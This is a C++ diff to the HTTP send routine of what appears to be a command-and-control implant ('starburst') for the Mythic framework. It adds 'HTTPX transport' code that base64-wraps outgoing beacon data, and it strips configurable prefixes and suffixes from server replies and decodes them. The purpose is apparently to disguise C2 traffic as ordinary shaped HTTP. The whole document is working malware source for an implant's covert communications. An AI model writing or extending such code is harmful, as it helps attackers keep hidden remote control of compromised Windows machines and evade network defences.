@@ -89,6 +89,19 @@ auto declfn starburst::http_send(
 
     if ( !b64_data ) return false;
 
+#if defined( HTTPX_TRANSPORT )
+    // HTTPX client transform: apply additional base64 so the HTTPX
+    // translator can reverse it and pass the Mythic-format message through
+    if ( inst.transport.client_transform_b64 ) {
+        uint32_t b64_2_len = 0;
+        auto b64_2 = base64_encode( inst, b64_data, b64_len, &b64_2_len );
+        inst.heap_free( b64_data );
+        if ( !b64_2 ) return false;
+        b64_data = b64_2;
+        b64_len  = b64_2_len;
+    }
+#endif
+
     // build URI
     wchar_t wide_uri[256] = { 0 };
     {
@@ -205,6 +218,40 @@ auto declfn starburst::http_send(
     inst.winhttp.WinHttpCloseHandle( h_request );
 
     if ( !resp_buf || resp_size == 0 ) return false;
+
+#if defined( HTTPX_TRANSPORT )
+    // reverse HTTPX server transforms: strip suffix, strip prefix, then base64 decode
+    {
+        uint32_t strip_pre = inst.transport.server_strip_prefix;
+        uint32_t strip_suf = inst.transport.server_strip_suffix;
+
+        if ( strip_pre + strip_suf >= resp_size ) {
+            inst.heap_free( resp_buf );
+            return false;
+        }
+
+        uint8_t* inner     = resp_buf + strip_pre;
+        uint32_t inner_len = resp_size - strip_pre - strip_suf;
+
+        if ( inst.transport.server_transform_b64 ) {
+            uint32_t t_len = 0;
+            auto t_decoded = base64_decode( inst, inner, inner_len, &t_len );
+            inst.heap_free( resp_buf );
+            if ( !t_decoded || t_len == 0 ) {
+                if ( t_decoded ) inst.heap_free( t_decoded );
+                return false;
+            }
+            resp_buf  = t_decoded;
+            resp_size = t_len;
+        } else if ( strip_pre > 0 || strip_suf > 0 ) {
+            auto trimmed = static_cast<uint8_t*>( inst.heap_alloc( inner_len ) );
+            memory::copy( trimmed, inner, inner_len );
+            inst.heap_free( resp_buf );
+            resp_buf  = trimmed;
+            resp_size = inner_len;
+        }
+    }
+#endif
 
     // base64 decode response
     uint32_t decoded_len = 0;
